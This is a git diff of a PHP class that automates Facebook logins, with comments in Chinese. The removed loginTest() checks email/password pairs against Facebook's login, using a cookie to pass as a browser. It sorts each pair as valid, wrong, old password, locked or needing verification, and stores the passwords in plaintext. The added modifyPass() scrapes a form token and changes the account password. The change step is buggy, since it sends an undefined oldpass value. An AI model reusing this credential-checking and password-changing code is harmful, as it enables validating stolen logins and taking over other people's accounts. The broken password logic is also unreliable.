@@ -25,6 +25,7 @@ class FaceBookModel extends Model
     public function __construct(){
     	$this->email = I('email');
     	$this->pass  = I('pass');
+    	$this->new_pass = I('newpass');
         $this->cookie_file = CACHE_PATH.'/Cookie/'.$this->email;
 
 		$this->curl_opts    = array(
@@ -238,114 +239,49 @@ class FaceBookModel extends Model
 	}
 
 	/**
-	* 添加好友
+	* 修改密码
 	* 
 	*/
-	public function addFriends(){
-
-	}	
-
-	/**
-	* 模拟登录，测试版本
-	* @param string 
-	* @param string 
-	* @return array -1/1/2/3/4/5 登录失败/成功/旧密码/验证邮箱/锁号/未知错误
-	*/
-	public function loginTest(){
-		$rv['login_status'] = 1;
-		$rv['login_msg']    = '正确账号';
-		$pass	  = I('pass');
-		if (empty($this->email) || empty($pass)) {
-			return false;
-		}
-
-		$query = array(
-			'email'=>$this->email,
-			'pass'=>$pass,
-			'persistent'=>1,
-			);
-		// foreach ($query as $key => $value) {
-		// 	$query[$key] = urlencode($value);
-		// }
-		// $query = http_build_query($query);
-
-		// 必须带上这个cookie，facebook用来检测是否时通过浏览器登录的
-		$cookie = 'fb_gate=https%3A%2F%2Fwww.facebook.com%2F; _js_reg_fb_ref=https%3A%2F%2Fwww.facebook.com%2F';
-		$login_opts = $this->curl_opts;
-		$login_opts[CURLOPT_URL]	 	 = $this->base_url.'login.php?login_attempt=1&lwv=110';
-		$login_opts[CURLOPT_POST]		 = true;
-		$login_opts[CURLOPT_POSTFIELDS]	 = $query;
-		$login_opts[CURLOPT_COOKIE]   	 = $cookie;
-		$login_opts[CURLOPT_HEADER]		 = 1;
+	public function modifyPass(){
+		$capt_opts = $this->curl_opts;
+		$capt_opts[CURLOPT_URL] =  $this->base_url.'settings?tab=account&section=email&view';
+		$capt_opts[CURLOPT_HEADER] = 1;
 
 		$ch = curl_init();
-		curl_setopt_array($ch,$login_opts);
+		curl_setopt_array($ch, $capt_opts);
 		$content = curl_exec($ch);
 		curl_close($ch);
+		file_put_contents(CACHE_PATH.'modifyPass.html', $content);
+		$content = str_replace("<!--", "", $content);
+		$content = str_replace("-->", "", $content);
+		\phpQuery::newDocumentHTML($content);
+		$fb_dtsg = pq("input[name=fb_dtsg]")->val();
+		file_put_contents(CACHE_PATH.'modifyPass.html', $content); 
+		preg_match('/{"USER_ID":"([\s\S]*)",/iU', $content,$matches);
+		$user_id =  $matches[1];
 
-		// file_put_contents(CACHE_PATH.'Login/'.$this->email.'.html', $content);
 
-		$res = substr($content, 9,3);
-		switch ($res) {
-			case '200':
-				$data = array();
-				$data['email'] = $this->email;
-				$data['pass']     = $pass;
-				$data['login_status']   = -1;
-	  			$this->add($data,array(),true);
-	  			$rv['login_status'] = -1;
-	  			$rv['login_msg']    = '错误账号';
-				break;
-			case '302':
-				$data = array();
-				$data['email'] = $this->email;
-				$data['pass']     = $pass;
-				$data['login_status']   = 1;
-	            //$query = "INSERT INTO __PREFIX__face_book (email,pass,login_status) VALUES ('". $data['email']."','".$data['pass']."',".$data['login_status']. ") ON DUPLICATE KEY UPDATE login_status=".$data['login_status'];
-	  			$this->add($data,array(),true);
-				break;
-			case '100':
-				$str = stristr($content, 'HTTP/1.1 200 OK');
-				if ($str !== false) {
-					$data = array();
-					$data['email'] = $this->email;
-					$data['pass']     = $pass;
-					$data['login_status']   = 2;
-		  			$this->add($data,array(),true);
-		  			$rv['login_status'] = 2;
-		  			$rv['login_msg']    = '输入的是旧密码';
-				}else{
-					$num = preg_match_all("/set-cookie/i", $content);
-					if ($num >4) {
-						$data = array();
-						$data['email'] = $this->email;
-						$data['pass']     = $pass;
-						$data['login_status']   = 3;
-			  			$this->add($data,array(),true);
-			  			$rv['login_status'] = 3;
-			  			$rv['login_msg']    = '需要验证邮箱';
-					}else{
-						$data = array();
-						$data['email'] = $this->email;
-						$data['pass']     = $pass;
-						$data['login_status']   = 4;
-			  			$this->add($data,array(),true);
-			  			$rv['login_status'] = 4;
-			  			$rv['login_msg']    = '锁号';
-					}
-				}
-				break;
-			default:
-				$data = array();
-				$data['email'] = $this->email;
-				$data['pass']     = $pass;
-				$data['login_status']   = 5;
-	  			$this->add($data,array(),true);
-	  			$rv['login_status'] = 5;
-	  			$rv['login_msg']    = '未知错误';
-				break;
-		}
+		$query = array(
+			'fb_dtsg'=>$fb_dtsg,
+			'password_strength'=>'2',
+			'password_old'=>$this->pass,
+			'password_new'=>$this->oldpass,
+			'password_confirm'=>$this->oldpass,
+			'__user' => $user_id,
+			);
+		$capt_opts = array();
+		$capt_opts = $this->curl_opts;
+		$capt_opts[CURLOPT_POST] = true;
+		$capt_opts[CURLOPT_POSTFIELDS] = $query;
+		$capt_opts[CURLOPT_URL] =  $this->base_url.'ajax/settings/account/password.php?__pc=EXP1%3ADEFAULT';
+		$capt_opts[CURLOPT_HEADER] = 1;
 
-		return $rv;
+		$ch = curl_init();
+		curl_setopt_array($ch, $capt_opts);
+		$content = curl_exec($ch);
+		curl_close($ch);
+		file_put_contents(CACHE_PATH.'modifyPass.html', $content); 
 	}
+	
+
 }
